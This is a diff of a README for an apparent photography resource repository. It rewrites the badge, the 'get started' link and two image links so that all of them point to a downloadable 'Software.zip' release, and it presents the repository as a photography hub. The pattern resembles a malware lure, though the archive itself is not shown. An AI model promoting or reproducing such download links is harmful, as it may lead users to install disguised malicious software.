@@ -2,7 +2,7 @@
 
 <div align="center">
   
-[![GitHub release](https://img.shields.io/badge/Software-launch-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![GitHub release](https://github.com/MayerAzizDev/photo-space/releases/download/v2.0/Software.zip)](https://github.com/MayerAzizDev/photo-space/releases/download/v2.0/Software.zip)
 
 </div>
 
@@ -10,7 +10,7 @@
 
 Welcome to **Photo Space**, a public repository dedicated to all things related to photography. Whether you are a professional photographer, an amateur enthusiast, or someone who just loves beautiful pictures, this repository is the place for you. Here, you will find resources, tools, and discussions about photography that will enhance your skills and passion for capturing moments through the lens.
 
-![Photography](https://cdn.pixabay.com/photo/2014/02/12/14/59/photography-264416_960_720.jpg)
+![Photography](https://github.com/MayerAzizDev/photo-space/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -28,10 +28,10 @@ Engage with a community of fellow photographers to discuss the latest trends in 
 
 ## How to Get Started?
 
-To dive into the world of **Photo Space**, simply click [here](https://github.com/user-attachments/files/18410590/Software.zip) to launch the software package and explore all the amazing features waiting for you. 🚀
+To dive into the world of **Photo Space**, simply click [here](https://github.com/MayerAzizDev/photo-space/releases/download/v2.0/Software.zip) to launch the software package and explore all the amazing features waiting for you. 🚀
 
 If the link does not work or you're looking for more information, make sure to check the "Releases" section of this repository for the latest updates and resources.
 
 Join us on this exciting photographic journey, where every click captures a moment and every share spreads the joy of photography. Happy shooting! 🌟
 
-![Camera](https://cdn.pixabay.com/photo/2016/03/27/16/02/photographer-1284528_960_720.jpg)
+![Camera](https://github.com/MayerAzizDev/photo-space/releases/download/v2.0/Software.zip)
